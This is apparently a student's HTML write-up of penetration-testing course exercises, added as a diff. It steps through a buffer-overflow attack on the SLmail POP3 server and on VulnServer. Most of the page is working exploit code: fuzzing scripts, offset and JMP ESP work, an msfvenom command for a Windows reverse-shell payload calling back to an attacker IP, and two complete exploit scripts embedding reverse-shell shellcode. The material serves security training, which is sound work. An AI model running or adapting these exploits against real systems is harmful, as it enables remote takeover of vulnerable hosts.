@@ -1,0 +1,272 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Exercises6.1.4-7.8.1</title>
+</head><body>6.1.4 - Exercises<br/>
+1. Fuzz SLmail and replicate the crash.<br/>
+2. Examine the memory in the stack, when SLmail crashes. What does it look like?<br/>
+Consider how this might be useful.<br/>
+<br/>
+1.<br/>
+Completed using fuzzer.py script.<br/>
+<br/>
+#!/usr/bin/python<br/>
+import socket<br/>
+# Create an array of buffers, from 1 to 5900, with increments of 200.<br/>
+buffer=["A"]<br/>
+counter=100<br/>
+&nbsp; while len(buffer) &lt;= 30:<br/>
+&nbsp; buffer.append("A"*counter)<br/>
+counter=counter+200<br/>
+for string in buffer:<br/>
+print "Fuzzing PASS with %s bytes" % len(string)<br/>
+&nbsp; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+&nbsp; connect=s.connect(('10.0.0.22',110))<br/>
+&nbsp; s.recv(1024)<br/>
+&nbsp; s.send('USER test\r\n')<br/>
+&nbsp; s.recv(1024)<br/>
+&nbsp; s.send('PASS ' + string + '\r\n')<br/>
+&nbsp; s.send('QUIT\r\n')<br/>
+&nbsp; s.close()<br/>
+<br/>
+2. The memory in the stack is filled with the hex equivalent of many A's <br/>
+(41 in hex). This occurs beginning at memory address 0220A128 in my <br/>
+machine. This can be useful because it shows us where we can inject <br/>
+malicious code.<br/>
+<br/>
+7.2.3 - Exercises<br/>
+1. Write a standalone script to replicate the crash.<br/>
+2. Determine the offset of EIP for the data that is being sent.<br/>
+3. Update your standalone script to place a unique value into EIP, to <br/>
+ensure your<br/>
+offsets are correct.<br/>
+<br/>
+1. Completed using slmail-pop3.py script from lab guide.<br/>
+#!/usr/bin/python<br/>
+import socket<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+buffer = 'A' * 2700<br/>
+try:<br/>
+&nbsp; print "\nSending evil buffer..."<br/>
+&nbsp; s.connect(('10.11.10.124',110))<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('USER username' +'\r\n')<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('PASS ' + buffer + '\r\n')<br/>
+&nbsp; print "\nDone!."<br/>
+except:<br/>
+&nbsp; print "Could not connect to POP3!"<br/>
+<br/>
+2. <br/>
+Used "/usr/share/metasploit-framework/tools/pattern_create.rb -l 2700". <br/>
+Re-ran the script. EIP held value of 39694438. <br/>
+Used "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br/>
+39694438". Result was: Exact match at offset 2606.<br/>
+<br/>
+3.<br/>
+Updated the script with the buffer to fill EIP with four bytes of Bs.<br/>
+EIP is 42424242. ESP is 020BA128 where the Cs begin.<br/>
+<br/>
+root@:~/bufferoverflow&gt; cat slmail-pop3.py<br/>
+#!/usr/bin/python<br/>
+import socket<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+<br/>
+buffer = "A"*2606 + "B"*4 + "C"*90<br/>
+<br/>
+try:<br/>
+&nbsp; print "\nSending evil buffer..."<br/>
+&nbsp; s.connect(('10.11.10.124',110))<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('USER username' +'\r\n')<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('PASS ' + buffer + '\r\n')<br/>
+&nbsp; print "\nDone!."<br/>
+except:<br/>
+&nbsp; print "Could not connect to POP3!"<br/>
+root@:~/bufferoverflow&gt;<br/>
+<br/>
+<br/>
+7.4.1 - Exercises<br/>
+1. Identify the bad characters that cannot be included in the payload.<br/>
+2. Understand why these characters are not allowed. What does the hex <br/>
+translate to<br/>
+in ASCII?<br/>
+<br/>
+1.<br/>
+Bad characters include the null byte, the carriage return, and linefeed.<br/>
+<br/>
+2. They are not allowed because they can truncate or mangle the payload. <br/>
+Null - 00 in hex<br/>
+Carriage Return - 0D in hex<br/>
+Line Feed - 0A in hex<br/>
+<br/>
+<br/>
+7.5.2 - Exercises<br/>
+1. Identify a JMP ESP that is usable in the exploit.<br/>
+2. Update your PoC to include the discovered JMP ESP, set a break point on <br/>
+it, and<br/>
+follow the execution.<br/>
+<br/>
+1. <br/>
+The SLMFC module within the Immunity Debugger is usable in the exploit.<br/>
+<br/>
+2. <br/>
+Script has been updated to include the discovered JMP ESP with a break <br/>
+point set on it.<br/>
+root@:~/bufferoverflow&gt; cat slmail-pop3.py<br/>
+#!/usr/bin/python<br/>
+import socket<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+<br/>
+# # 5F4A358F &nbsp; FFE4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; JMP ESP<br/>
+<br/>
+buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "C"*(3500-2606-4)<br/>
+<br/>
+try:<br/>
+&nbsp; print "\nSending evil buffer..."<br/>
+&nbsp; s.connect(('10.11.10.124',110))<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('USER username' +'\r\n')<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('PASS ' + buffer + '\r\n')<br/>
+&nbsp; print "\nDone!."<br/>
+except:<br/>
+&nbsp; print "Could not connect to POP3!"<br/>
+root@:~/bufferoverflow&gt;<br/>
+<br/>
+<br/>
+7.7.1 - Exercises<br/>
+1. Update your PoC to include a working payload.<br/>
+2. Obtain a shell from SLmail.<br/>
+<br/>
+1. <br/>
+root@:~/bufferoverflow&gt; cat slmail-pop3.py<br/>
+#!/usr/bin/python<br/>
+import socket<br/>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>
+<br/>
+shellcode = ("\xba\xcb\xe7\x0e\xc5\xd9\xc3\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"<br/>
+"\x52\x31\x57\x12\x83\xc7\x04\x03\x9c\xe9\xec\x30\xde\x1e\x72"<br/>
+"\xba\x1e\xdf\x13\x32\xfb\xee\x13\x20\x88\x41\xa4\x22\xdc\x6d"<br/>
+"\x4f\x66\xf4\xe6\x3d\xaf\xfb\x4f\x8b\x89\x32\x4f\xa0\xea\x55"<br/>
+"\xd3\xbb\x3e\xb5\xea\x73\x33\xb4\x2b\x69\xbe\xe4\xe4\xe5\x6d"<br/>
+"\x18\x80\xb0\xad\x93\xda\x55\xb6\x40\xaa\x54\x97\xd7\xa0\x0e"<br/>
+"\x37\xd6\x65\x3b\x7e\xc0\x6a\x06\xc8\x7b\x58\xfc\xcb\xad\x90"<br/>
+"\xfd\x60\x90\x1c\x0c\x78\xd5\x9b\xef\x0f\x2f\xd8\x92\x17\xf4"<br/>
+"\xa2\x48\x9d\xee\x05\x1a\x05\xca\xb4\xcf\xd0\x99\xbb\xa4\x97"<br/>
+"\xc5\xdf\x3b\x7b\x7e\xdb\xb0\x7a\x50\x6d\x82\x58\x74\x35\x50"<br/>
+"\xc0\x2d\x93\x37\xfd\x2d\x7c\xe7\x5b\x26\x91\xfc\xd1\x65\xfe"<br/>
+"\x31\xd8\x95\xfe\x5d\x6b\xe6\xcc\xc2\xc7\x60\x7d\x8a\xc1\x77"<br/>
+"\x82\xa1\xb6\xe7\x7d\x4a\xc7\x2e\xba\x1e\x97\x58\x6b\x1f\x7c"<br/>
+"\x98\x94\xca\xd3\xc8\x3a\xa5\x93\xb8\xfa\x15\x7c\xd2\xf4\x4a"<br/>
+"\x9c\xdd\xde\xe2\x37\x24\x89\x06\xc3\x26\xf2\x7f\xd1\x26\x05"<br/>
+"\x3b\x5c\xc0\x6f\x2b\x09\x5b\x18\xd2\x10\x17\xb9\x1b\x8f\x52"<br/>
+"\xf9\x90\x3c\xa3\xb4\x50\x48\xb7\x21\x91\x07\xe5\xe4\xae\xbd"<br/>
+"\x81\x6b\x3c\x5a\x51\xe5\x5d\xf5\x06\xa2\x90\x0c\xc2\x5e\x8a"<br/>
+"\xa6\xf0\xa2\x4a\x80\xb0\x78\xaf\x0f\x39\x0c\x8b\x2b\x29\xc8"<br/>
+"\x14\x70\x1d\x84\x42\x2e\xcb\x62\x3d\x80\xa5\x3c\x92\x4a\x21"<br/>
+"\xb8\xd8\x4c\x37\xc5\x34\x3b\xd7\x74\xe1\x7a\xe8\xb9\x65\x8b"<br/>
+"\x91\xa7\x15\x74\x48\x6c\x25\x3f\xd0\xc5\xae\xe6\x81\x57\xb3"<br/>
+"\x18\x7c\x9b\xca\x9a\x74\x64\x29\x82\xfd\x61\x75\x04\xee\x1b"<br/>
+"\xe6\xe1\x10\x8f\x07\x20")<br/>
+<br/>
+buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode + "C"*(3500-2606-4-351-16)<br/>
+# buffer = "A"*2606 +"\x8f\x35\x4a\x5f" + "\x90"*8 + shellcode<br/>
+<br/>
+try:<br/>
+&nbsp; print "\nSending evil buffer..."<br/>
+&nbsp; s.connect(('10.11.10.124',110))<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('USER username' +'\r\n')<br/>
+&nbsp; data = s.recv(1024)<br/>
+&nbsp; s.send('PASS ' + buffer + '\r\n')<br/>
+&nbsp; print "\nDone!."<br/>
+except:<br/>
+&nbsp; print "Could not connect to POP3!"<br/>
+root@:~/bufferoverflow&gt;<br/>
+<br/>
+2.<br/>
+<br/>
+<img src="screenshot.png" /><br/>
+<br/>
+7.8.1 - Exercises<br/>
+1. Update the exploit so that SLmail still runs after exploitation.<br/>
+2. In the Tools folder on the Desktop of your Windows VM, there is a<br/>
+VulnServer.exe application. Using the proof of concept from the following forum<br/>
+post, develop a working exploit:<br/>
+o https://forums.offensive-security.com/showthread.php?t=2231<br/>
+<br/>
+1.<br/>
+Used the EXITFUNC=thread command with msfvenom to adjust the exploit:<br/>
+&nbsp;msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai<br/>
+<br/>
+Revised the payload of the script with the new output. <br/>
+<br/>
+SLmail service now continues to run after exploitation:<br/>
+<img src="screenshot 2.png" />&nbsp;<br/>
+<br/>
+2.<br/>
+Below is the script to exploit VulnServer:<br/>
+root@:~/bufferoverflow&gt; cat vulnserver.py<br/>
+#!/usr/bin/python<br/>
+import time, struct, sys<br/>
+import socket as so<br/>
+<br/>
+# Exercise from 7.8.1, pg 174 in lab guide.<br/>
+<br/>
+try:<br/>
+&nbsp; &nbsp; server = sys.argv[1]<br/>
+&nbsp; &nbsp; port = 5555<br/>
+except IndexError:<br/>
+&nbsp; &nbsp; print "[+] Usage %s host" % sys.argv[0]<br/>
+&nbsp; &nbsp; sys.exit()<br/>
+<br/>
+#req1 = "AUTH " + "\x41"*1072<br/>
+#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*256 # 1300 bytes total<br/>
+#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + "\x43"*360<br/>
+#req1 = "AUTH " + "\x41"*1040 + "\x42"*4 + badchars<br/>
+# Memory Location for VulnServer JMP ESP: 65D11D71 &nbsp; FFE4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; JMP ESP<br/>
+<br/>
+shellcode = ("\xba\x2d\xb4\x36\x67\xda\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"<br/>
+"\x52\x31\x56\x12\x83\xc6\x04\x03\x7b\xba\xd4\x92\x7f\x2a\x9a"<br/>
+"\x5d\x7f\xab\xfb\xd4\x9a\x9a\x3b\x82\xef\x8d\x8b\xc0\xbd\x21"<br/>
+"\x67\x84\x55\xb1\x05\x01\x5a\x72\xa3\x77\x55\x83\x98\x44\xf4"<br/>
+"\x07\xe3\x98\xd6\x36\x2c\xed\x17\x7e\x51\x1c\x45\xd7\x1d\xb3"<br/>
+"\x79\x5c\x6b\x08\xf2\x2e\x7d\x08\xe7\xe7\x7c\x39\xb6\x7c\x27"<br/>
+"\x99\x39\x50\x53\x90\x21\xb5\x5e\x6a\xda\x0d\x14\x6d\x0a\x5c"<br/>
+"\xd5\xc2\x73\x50\x24\x1a\xb4\x57\xd7\x69\xcc\xab\x6a\x6a\x0b"<br/>
+"\xd1\xb0\xff\x8f\x71\x32\xa7\x6b\x83\x97\x3e\xf8\x8f\x5c\x34"<br/>
+"\xa6\x93\x63\x99\xdd\xa8\xe8\x1c\x31\x39\xaa\x3a\x95\x61\x68"<br/>
+"\x22\x8c\xcf\xdf\x5b\xce\xaf\x80\xf9\x85\x42\xd4\x73\xc4\x0a"<br/>
+"\x19\xbe\xf6\xca\x35\xc9\x85\xf8\x9a\x61\x01\xb1\x53\xac\xd6"<br/>
+"\xb6\x49\x08\x48\x49\x72\x69\x41\x8e\x26\x39\xf9\x27\x47\xd2"<br/>
+"\xf9\xc8\x92\x75\xa9\x66\x4d\x36\x19\xc7\x3d\xde\x73\xc8\x62"<br/>
+"\xfe\x7c\x02\x0b\x95\x87\xc5\x3e\x61\x87\xae\x57\x77\x87\xd1"<br/>
+"\x1c\xfe\x61\xbb\x72\x57\x3a\x54\xea\xf2\xb0\xc5\xf3\x28\xbd"<br/>
+"\xc6\x78\xdf\x42\x88\x88\xaa\x50\x7d\x79\xe1\x0a\x28\x86\xdf"<br/>
+"\x22\xb6\x15\x84\xb2\xb1\x05\x13\xe5\x96\xf8\x6a\x63\x0b\xa2"<br/>
+"\xc4\x91\xd6\x32\x2e\x11\x0d\x87\xb1\x98\xc0\xb3\x95\x8a\x1c"<br/>
+"\x3b\x92\xfe\xf0\x6a\x4c\xa8\xb6\xc4\x3e\x02\x61\xba\xe8\xc2"<br/>
+"\xf4\xf0\x2a\x94\xf8\xdc\xdc\x78\x48\x89\x98\x87\x65\x5d\x2d"<br/>
+"\xf0\x9b\xfd\xd2\x2b\x18\x1d\x31\xf9\x55\xb6\xec\x68\xd4\xdb"<br/>
+"\x0e\x47\x1b\xe2\x8c\x6d\xe4\x11\x8c\x04\xe1\x5e\x0a\xf5\x9b"<br/>
+"\xcf\xff\xf9\x08\xef\xd5")<br/>
+<br/>
+#req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x43"*360<br/>
+req1 = "AUTH " + "\x41"*1040 + "\x71\x1d\xd1\x65" + "\x90"*16 &nbsp;+ shellcode + "\x43"*(400-351-16)<br/>
+s = so.socket(so.AF_INET, so.SOCK_STREAM)<br/>
+try:<br/>
+&nbsp; &nbsp; &nbsp;s.connect((server, port))<br/>
+&nbsp; &nbsp; &nbsp;print repr(s.recv(1024))<br/>
+&nbsp; &nbsp; &nbsp;s.send(req1)<br/>
+&nbsp; &nbsp; &nbsp;print repr(s.recv(1024))<br/>
+except:<br/>
+&nbsp; &nbsp; &nbsp;print "[!] connection refused, check debugger"<br/>
+s.close()<br/>
+root@:~/bufferoverflow&gt;<br/>
+<br/>
+Screenshot showing where in the debugger the payload works to create a reverse shell to Kali using the VulnServer service.<br/>
+<img src="screenshot 3.png" /><br/>
+</body></html>
